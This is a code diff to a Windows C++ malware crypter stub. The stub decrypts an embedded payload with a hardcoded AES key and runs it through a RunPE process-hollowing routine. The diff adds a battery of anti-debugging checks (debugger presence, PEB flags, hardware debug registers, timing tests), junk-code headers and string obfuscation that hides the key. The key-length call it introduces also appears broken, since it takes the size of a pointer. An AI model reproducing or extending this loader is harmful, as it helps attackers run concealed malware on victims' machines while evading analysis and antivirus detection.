@@ -3,8 +3,12 @@
 #include <fstream>
 #include "Runpe.h"
 #include <vector>
+#include "Junk2.h"
 #include <string>
 #include "Header.h"
+#include "antidbg.h"
+#include "Junk3.h"
+#include "obfuscat.h"
 using namespace std;
 
 
@@ -26,15 +30,14 @@ void Resource(int id)
 
 void AESDecrypt(std::vector<char> toDecrypt, int size)
 {
-	//Explanation exist in Builder
-	unsigned char key[KEY_256] = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";
-
+	XorS(X, OBFUSCATE("S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>"));
+	std::string temp = X.decrypt();
 	unsigned char ciphertext[BLOCK_SIZE];
 	unsigned char decrypted[BLOCK_SIZE];
 
 	aes_ctx_t* ctx;
 	virtualAES::initialize();
-	ctx = virtualAES::allocatectx(key, sizeof(key));
+	ctx = virtualAES::allocatectx((unsigned char *)temp.c_str(), sizeof(temp.c_str()));
 
 	int count = 0;
 	int index = size / 16;
@@ -71,17 +74,27 @@ void enc()
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-	Resource(10);
-	enc();
+	adbg_IsDebuggerPresent();
+	adbg_IsDebuggerPresent();
+	adbg_CheckRemoteDebuggerPresent();
+	adbg_NtQueryInformationProcess();
+	adbg_BeingDebuggedPEB();
+	adbg_NtGlobalFlagPEB();
+	adbg_HardwareDebugRegisters();
+	adbg_RDTSC();
+	adbg_QueryPerformanceCounter();
+	adbg_GetTickCount();
 
+	Resource(10);
 	LPVOID pFile;
 	TCHAR szFilePath[1024];
-
+	enc();
 	pFile = RData.data();
 	if (pFile)
 	{
 		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
 		NTRX_RUNPE32(pFile);
 	}
+
 	return 0;
 };
